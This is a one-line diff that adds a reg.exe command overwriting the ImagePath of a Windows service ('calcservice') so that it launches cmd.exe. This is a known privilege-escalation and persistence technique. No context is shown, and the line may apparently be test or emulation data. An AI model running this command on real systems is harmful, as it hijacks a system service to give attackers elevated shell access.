@@ -1,0 +1,1 @@
+reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\calcservice" /f /v ImagePath /d "%windir%\system32\cmd.exe"
